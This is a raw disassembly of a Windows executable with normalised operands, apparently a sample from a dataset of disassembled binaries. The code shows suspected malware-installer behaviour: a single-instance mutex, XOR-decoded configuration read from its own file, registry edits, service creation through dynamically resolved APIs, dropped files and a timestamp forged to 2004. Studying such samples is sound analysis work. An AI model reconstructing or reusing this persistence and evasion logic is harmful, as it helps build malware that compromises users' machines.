sub_401058
push ebp
mov ebp esp
sub esp 0x208
push esi
push rw-data
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
mov esi eax
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
xor eax eax
cmp eax 0x5
je r-xdata
push esi
call [ ReleaseMutex@IAT ]
push esi
call [ CloseHandle@IAT ]
call sub_401765
test eax eax
je r-xdata
mov esi [ Sleep@IAT ]
push edi
push 0xa
call esi
push sub_4016a6
call [ SetUnhandledExceptionFilter@IAT ]
call sub_401132
push rw-data
mov edi eax
call [ DeleteFileA@IAT ]
test edi edi
je r-xdata
xor eax eax
pop edi
jmp r-xdata
push edi
call sub_4016b5
lea eax [ ebp - 0x104 ]
mov [ esp ] 0x104
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x104 ]
push eax
lea eax [ ebp - 0x208 ]
push rw-data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x208 ]
push eax
push edi
push rw-data
push rw-data
call [ WritePrivateProfileStringA@IAT ]
push 0xa
call esi
pop esi
leave
retn 0x10
sub_401132
mov eax sub_402334
call sub_402170
sub esp 0xe7c
push ebx
push esi
push edi
mov esi rw-data
mov [ ebp - 0x10 ] esp
push 0x7
pop ecx
lea edi [ ebp - 0x8c ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x8c ]
xor ebx ebx
push rw-data
push eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] 0x80000002
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
movsb [ edi ] [ esi ]
call strcat
pop ecx
lea eax [ ebp - 0x14 ]
pop ecx
push eax
push 0x1
lea eax [ ebp - 0x8c ]
push ebx
push eax
push [ ebp - 0x14 ]
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x50 ] 0x400
push eax
lea eax [ ebp - 0xc88 ]
push eax
lea eax [ ebp - 0x6c ]
push eax
push ebx
push rw-data
push [ ebp - 0x14 ]
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x14 ]
mov esi eax
call [ RegCloseKey@IAT ]
push esi
call [ SetLastError@IAT ]
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
mov [ ebp - 0x44 ] rw-data
call _CxxThrowException
mov edi [ Sleep@IAT ]
push 0xa
call edi
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
cmp eax ebx
mov [ ebp - 0x28 ] eax
jne r-xdata
lea eax [ ebp - 0x40 ]
push r--data
push eax
mov [ ebp - 0x40 ] rw-data
call _CxxThrowException
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
lea ecx [ ebp - 0x294 ]
push 0x104
push ecx
call eax
lea esi [ ebp - 0xc88 ]
lea eax [ ebp - 0x58 ]
push r--data
push eax
mov [ ebp - 0x58 ] rw-data
call _CxxThrowException
cmp [ ebp - 0x18 ] ebx
jne r-xdata
push rw-data
push esi
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
call [ lstrlenA@IAT ]
inc eax
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x1c ] eax
push esi
push eax
call [ lstrcpyA@IAT ]
cmp [ ebp - 0x18 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push esi
call [ strchr@IAT ]
pop ecx
inc eax
pop ecx
mov esi eax
jmp r-xdata
push esi
lea eax [ ebp - 0x888 ]
push rw-data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
push 0x1
lea eax [ ebp - 0x888 ]
push ebx
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
jne r-xdata
push 0xa
call edi
push [ ebp - 0x18 ]
mov esi [ CloseServiceHandle@IAT ]
call esi
push [ ebp - 0x28 ]
call esi
push 0x400
lea eax [ ebp - 0xc88 ]
push rw-data
push eax
mov [ ebp - 0x14 ] 0x80000002
call [ strncpy@IAT ]
push 0x64
lea eax [ ebp - 0xc88 ]
push [ ebp - 0x1c ]
push eax
call [ strncat@IAT ]
add esp 0x18
lea eax [ ebp - 0x14 ]
push eax
push 0xf003f
lea eax [ ebp - 0xc88 ]
push ebx
push eax
push [ ebp - 0x14 ]
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x54 ]
push r--data
push eax
mov [ ebp - 0x54 ] rw-data
call _CxxThrowException
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp [ esi ] bl
je r-xdata
push 0x104
lea eax [ ebp - 0x190 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x294 ]
push esi
push eax
lea eax [ ebp - 0x190 ]
push rw-data
push eax
call [ wsprintfA@IAT ]
add esp 0x10
push 0xa
call edi
lea eax [ ebp - 0x190 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x190 ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x14 ]
call [ RegCloseKey@IAT ]
jmp r-xdata
push 0xa
mov [ ebp - 0x20 ] 0x120
call edi
lea eax [ ebp - 0x20 ]
push 0x4
push eax
push 0x4
push ebx
push rw-data
push [ ebp - 0x14 ]
call [ RegSetValueExA@IAT ]
mov esi [ SetLastError@IAT ]
push eax
mov [ ebp - 0x24 ] eax
call esi
cmp [ ebp - 0x24 ] ebx
je r-xdata
lea eax [ ebp - 0x4c ]
push r--data
push eax
mov [ ebp - 0x4c ] rw-data
call _CxxThrowException
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push ebx
push ebx
push ebx
push ebx
mov ecx rw-data
push ebx
push ecx
push 0x1
push 0x2
push 0x20
push 0xf01ff
push esi
push esi
push [ ebp - 0x28 ]
call eax
cmp eax ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
push 0xa
call edi
lea eax [ ebp - 0x30 ]
push eax
push rw-data
push [ ebp - 0x14 ]
call [ RegCreateKeyA@IAT ]
mov edi eax
push edi
call esi
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x48 ]
push r--data
push eax
mov [ ebp - 0x48 ] rw-data
call _CxxThrowException
push rw-data
push rw-data
call [ fopen@IAT ]
mov esi rw-data
lea edi [ ebp - 0x694 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov [ ebp - 0x20 ] eax
mov ecx 0xfd
xor eax eax
lea edi [ ebp - 0x68a ]
[ edi ]
stosw [ edi ]
mov esi rw-data
lea eax [ ebp - 0x694 ]
push esi
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x190 ]
push eax
lea eax [ ebp - 0xe88 ]
push [ ebp - 0x1c ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0xe88 ]
push eax
lea eax [ ebp - 0x694 ]
push eax
call strcat
lea eax [ ebp - 0x694 ]
push esi
push eax
call strcat
add esp 0x20
lea eax [ ebp - 0x694 ]
push [ ebp - 0x20 ]
push eax
call strlen
pop ecx
push eax
lea eax [ ebp - 0x694 ]
push 0x1
push eax
call [ fwrite@IAT ]
push [ ebp - 0x20 ]
call [ fclose@IAT ]
add esp 0x14
push 0xa
call [ Sleep@IAT ]
mov esi rw-data
push esi
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push ebx
push rw-data
call eax
jmp r-xdata
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] rw-data
call _CxxThrowException
push [ ebp - 0x14 ]
mov edi [ RegCloseKey@IAT ]
or [ ebp - 0x4 ] 0xffffffff
call edi
push [ ebp - 0x30 ]
call edi
push [ ebp - 0x18 ]
mov edi [ CloseServiceHandle@IAT ]
call edi
push [ ebp - 0x28 ]
call edi
cmp [ ebp - 0x1c ] ebx
je r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push 0x80
push 0x2
push ebx
push ebx
lea eax [ ebp - 0x190 ]
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
push esi
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push 0x7d0
call eax
push 0x10
lea eax [ ebp - 0x68 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x68 ] 0x7d4
mov [ ebp - 0x66 ] 0x8
push eax
lea eax [ ebp - 0x68 ]
push eax
mov [ ebp - 0x62 ] 0x11
mov [ ebp - 0x60 ] 0x14
mov [ ebp - 0x5e ] bx
call [ SystemTimeToFileTime@IAT ]
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call [ LocalFileTimeToFileTime@IAT ]
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x3c ]
push ebx
push eax
push edi
call [ SetFileTime@IAT ]
push esi
mov [ ebp - 0x24 ] ebx
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
lea ecx [ ebp - 0x24 ]
push ebx
push ecx
push 0x1fc00
push rw-data
push edi
call eax
push 0xa
call [ Sleep@IAT ]
push edi
call [ CloseHandle@IAT ]
sub_4016b5
push ebp
mov ebp esp
sub esp 0x14
push edi
xor edi edi
push 0x2
push edi
push edi
call [ OpenSCManagerA@IAT ]
cmp eax edi
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
leave
retn
push ebx
push esi
push 0x10010
push [ ebp + 0x8 ]
push eax
call [ OpenServiceA@IAT ]
mov esi [ CloseServiceHandle@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
push [ ebp - 0x4 ]
call esi
pop esi
pop ebx
push 0x10
lea eax [ ebp - 0x14 ]
push edi
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x14 ]
push rw-data
push eax
call strcat
add esp 0x10
push rw-data
call [ LoadLibraryA@IAT ]
lea ecx [ ebp - 0x14 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
push edi
push edi
push ebx
call eax
push ebx
call esi
sub_401743
xor edx edx
cmp [ esp + 0x8 ] edx
jle r-xdata
retn
mov eax [ esp + 0x4 ]
lea ecx [ edx + eax ]
mov al [ edx + eax ]
test al al
je r-xdata
inc edx
cmp edx [ esp + 0x8 ]
jl r-xdata
xor al 0x3e
mov [ ecx ] al
sub_401765
mov eax sub_402379
call sub_402170
sub esp 0x5e0
mov al [ ebp - 0x11 ]
push ebx
push esi
xor ebx ebx
push edi
push ebx
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x9c ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov esi rw-data
push esi
call strlen
pop ecx
push eax
push esi
lea ecx [ ebp - 0x9c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov al [ ebp - 0x11 ]
push ebx
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8c ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
push esi
call strlen
pop ecx
push eax
push esi
lea ecx [ ebp - 0x8c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov al [ ebp - 0x11 ]
push ebx
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x7c ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
push esi
call strlen
pop ecx
push eax
push esi
lea ecx [ ebp - 0x7c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov esi 0x104
lea eax [ ebp - 0x4e8 ]
push esi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ebx
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x4e8 ]
push eax
lea eax [ ebp - 0x1e0 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
mov edi 0x80
lea eax [ ebp - 0x1e0 ]
push ebx
push edi
push 0x2
push ebx
push 0x3
push 0xc0000000
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
xor esi esi
push eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x5ec ]
push esi
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x5ec ]
push rw-data
push eax
call [ fopen@IAT ]
pop ecx
cmp eax ebx
pop ecx
mov [ ebp - 0x10 ] eax
je r-xdata
push edi
lea eax [ ebp - 0x2e0 ]
push ebx
push eax
call memset
mov esi [ fseek@IAT ]
push ebx
push 0x2b0
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2e0 ]
push edi
mov edi [ fread@IAT ]
push 0x1
push eax
call edi
lea eax [ ebp - 0x2e0 ]
push 0x80
push eax
call sub_401743
lea eax [ ebp - 0x2e0 ]
push eax
call strlen
add esp 0x34
test eax eax
jbe r-xdata
push 0x104
lea eax [ ebp - 0x3e4 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x2e0 ]
push eax
lea eax [ ebp - 0x3e4 ]
push rw-data
push eax
call [ sprintf@IAT ]
push 0x80
lea eax [ ebp - 0x260 ]
push ebx
push eax
call memset
push ebx
push 0x330
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x260 ]
push 0x80
push 0x1
push eax
call edi
lea eax [ ebp - 0x260 ]
push 0x80
push eax
call sub_401743
lea eax [ ebp - 0x260 ]
push eax
call strlen
add esp 0x40
test eax eax
jbe r-xdata
push rw-data
call strlen
pop ecx
push eax
push rw-data
lea eax [ ebp - 0x260 ]
push eax
call strlen
pop ecx
push eax
lea eax [ ebp - 0x260 ]
push eax
jmp r-xdata
push ebx
push 0x3f6
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x68 ]
push 0x1
push 0x1
push eax
call edi
push [ ebp - 0x10 ]
call [ fclose@IAT ]
add esp 0x20
mov esi [ WritePrivateProfileStringA@IAT ]
lea eax [ ebp - 0x1e0 ]
mov edi rw-data
push eax
lea eax [ ebp - 0x3e4 ]
push eax
push rw-data
push edi
call esi
lea eax [ ebp - 0xac ]
push eax
call sub_402034
pop ecx
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov [ ebp - 0x4 ] 0x3
push [ ecx ]
lea ecx [ ebp - 0x8c ]
push ebx
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
push 0x1
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x2
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov eax [ ebp - 0x88 ]
cmp eax ebx
jne r-xdata
push 0x10
lea eax [ ebp - 0x44 ]
push ebx
push eax
call memset
push ebx
push 0x3c2
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x44 ]
push 0x10
push 0x1
push eax
call edi
lea eax [ ebp - 0x44 ]
push 0x10
push eax
call sub_401743
lea eax [ ebp - 0x44 ]
push eax
call strlen
add esp 0x34
test eax eax
jbe r-xdata
lea ecx [ ebp - 0x7c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
push ebx
push 0x3b0
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push 0x4
push 0x1
push eax
call edi
push ebx
push 0x3b4
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x24 ]
push 0x4
push 0x1
push eax
call edi
push ebx
push 0x3b8
push [ ebp - 0x10 ]
call esi
add esp 0x44
lea eax [ ebp - 0x1c ]
push [ ebp - 0x10 ]
push 0x4
push 0x1
push eax
call edi
push ebx
push 0x3bc
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push 0x4
push 0x1
push eax
call edi
push ebx
push 0x3c0
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x6c ]
push 0x1
push 0x1
push eax
call edi
add esp 0x48
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x28 ] ebx
push ebx
push 0x3c1
push [ ebp - 0x10 ]
mov [ ebp - 0x30 ] ebx
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x20 ]
push 0x1
push 0x1
push eax
call edi
add esp 0x1c
cmp [ ebp - 0x20 ] ebx
je r-xdata
lea ecx [ ebp - 0x1e0 ]
push ecx
push eax
push rw-data
push edi
call esi
lea eax [ ebp - 0xac ]
push eax
call sub_401f78
pop ecx
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov [ ebp - 0x4 ] 0x4
push [ ecx ]
lea ecx [ ebp - 0x9c ]
push ebx
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
push 0x1
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x2
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov eax [ ebp - 0x98 ]
cmp eax ebx
jne r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
push 0x10
lea eax [ ebp - 0xbc ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0xbc ]
push rw-data
push eax
call [ sprintf@IAT ]
push ebx
push 0x3d2
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x28 ]
push 0x2
push 0x1
push eax
call edi
add esp 0x28
cmp [ ebp - 0x28 ] ebx
jle r-xdata
lea ecx [ ebp - 0x1e0 ]
push ecx
push eax
push rw-data
push edi
call esi
push 0x5
lea eax [ ebp - 0x5c ]
push ebx
push eax
call memset
add esp 0xc
cmp [ ebp - 0x34 ] ebx
jg r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
push 0x10
lea eax [ ebp - 0x44 ]
push ebx
push eax
call memset
push ebx
push 0x3d4
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x44 ]
push 0x10
push 0x1
push eax
call edi
lea eax [ ebp - 0x44 ]
push 0x10
push eax
call sub_401743
push 0x10
lea eax [ ebp - 0xcc ]
push ebx
push eax
call memset
add esp 0x3c
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0xcc ]
push rw-data
push eax
call [ sprintf@IAT ]
push 0x10
lea eax [ ebp - 0x44 ]
push ebx
push eax
call memset
push ebx
push 0x3e4
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x44 ]
push 0x10
push 0x1
push eax
call edi
lea eax [ ebp - 0x44 ]
push 0x10
push eax
call sub_401743
push 0x10
lea eax [ ebp - 0xdc ]
push ebx
push eax
call memset
add esp 0x48
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0xdc ]
push rw-data
push eax
call [ sprintf@IAT ]
push ebx
push 0x3f4
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push 0x2
push 0x1
push eax
call edi
add esp 0x28
cmp [ ebp - 0x30 ] ebx
jl r-xdata
push [ ebp - 0x34 ]
lea eax [ ebp - 0x5c ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x5c ]
push rw-data
push eax
call [ sprintf@IAT ]
pop ecx
pop ecx
jmp r-xdata
push [ ebp - 0x24 ]
lea eax [ ebp - 0x54 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x54 ]
push rw-data
push eax
call [ sprintf@IAT ]
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
push rw-data
push edi
call esi
push 0x5
lea eax [ ebp - 0x54 ]
push ebx
push eax
call memset
add esp 0xc
cmp [ ebp - 0x24 ] ebx
jg r-xdata
push [ ebp - 0x1c ]
lea eax [ ebp - 0x4c ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x4c ]
push rw-data
push eax
call [ sprintf@IAT ]
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push rw-data
push edi
call esi
push 0x5
lea eax [ ebp - 0x4c ]
push ebx
push eax
call memset
add esp 0xc
cmp [ ebp - 0x1c ] ebx
jg r-xdata
push [ ebp - 0x2c ]
lea eax [ ebp - 0x64 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x64 ]
push rw-data
push eax
call [ sprintf@IAT ]
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push rw-data
push edi
call esi
push 0x5
lea eax [ ebp - 0x64 ]
push ebx
push eax
call memset
add esp 0xc
cmp [ ebp - 0x2c ] ebx
jg r-xdata
lea ecx [ ebp - 0x1e0 ]
push ecx
push eax
push rw-data
push edi
call esi
cmp [ ebp - 0x6c ] ebx
lea eax [ ebp - 0x1e0 ]
push eax
je r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
push rw-data
push edi
call esi
mov eax [ ebp - 0x78 ]
cmp eax ebx
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push rw-data
push rw-data
push rw-data
push rw-data
mov edi rw-data
push rw-data
push edi
call esi
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0xbc ]
push eax
push rw-data
push edi
call esi
push 0x4
lea eax [ ebp - 0x18 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x18 ]
push [ ebp - 0x28 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push rw-data
push edi
call esi
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0xcc ]
push eax
push rw-data
push edi
call esi
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0xdc ]
push eax
push rw-data
push edi
call esi
push 0x4
lea eax [ ebp - 0x18 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x18 ]
push [ ebp - 0x30 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push rw-data
push edi
jmp r-xdata
push rw-data
push edi
call esi
cmp [ ebp - 0x20 ] ebx
lea eax [ ebp - 0x1e0 ]
push eax
je r-xdata
push rw-data
push rw-data
jmp r-xdata
call esi
cmp [ ebp - 0x68 ] ebx
lea eax [ ebp - 0x1e0 ]
push eax
je r-xdata
push 0x1
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
push 0x1
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x4 ] bl
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
or [ ebp - 0x4 ] 0xffffffff
push 0x1
lea ecx [ ebp - 0x9c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
push rw-data
push rw-data
call esi
push 0x1
pop esi
jmp r-xdata
sub_401f78
push ebp
mov ebp esp
sub esp 0x20c
push esi
push edi
mov esi 0x104
xor edi edi
push esi
lea eax [ ebp - 0x20c ]
push edi
push eax
mov [ ebp - 0x4 ] edi
call memset
push esi
lea eax [ ebp - 0x108 ]
push edi
push eax
call memset
add esp 0x18
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push 0x5
push edi
call [ SHGetSpecialFolderLocation@IAT ]
cmp [ ebp - 0x4 ] edi
je r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ sprintf@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x108 ]
push eax
push [ ebp - 0x4 ]
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
push esi
push eax
lea eax [ ebp - 0x108 ]
push eax
call [ GetShortPathNameA@IAT ]
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov al [ ebp + 0xb ]
push edi
mov ecx esi
mov [ esi ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
lea eax [ ebp - 0x108 ]
push eax
call strlen
pop ecx
push eax
lea eax [ ebp - 0x108 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov eax esi
pop edi
pop esi
leave
retn
sub_402034
push ebp
mov ebp esp
sub esp 0x20c
push esi
push edi
mov esi 0x104
xor edi edi
push esi
lea eax [ ebp - 0x20c ]
push edi
push eax
mov [ ebp - 0x4 ] edi
call memset
push esi
lea eax [ ebp - 0x108 ]
push edi
push eax
call memset
add esp 0x18
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push 0x8
push edi
call [ SHGetSpecialFolderLocation@IAT ]
cmp [ ebp - 0x4 ] edi
je r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ sprintf@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x108 ]
push eax
push [ ebp - 0x4 ]
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
push esi
push eax
lea eax [ ebp - 0x108 ]
push eax
call [ GetShortPathNameA@IAT ]
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov al [ ebp + 0xb ]
push edi
mov ecx esi
mov [ esi ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
lea eax [ ebp - 0x108 ]
push eax
call strlen
pop ecx
push eax
lea eax [ ebp - 0x108 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov eax esi
pop edi
pop esi
leave
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4016a5
cmp [ rw-data ] ebx
jne r-xdata
call sub_402312
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_402324
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401058
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401000
call ??0Init@ios_base@std@@QAE@XZ
jmp sub_401015
??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
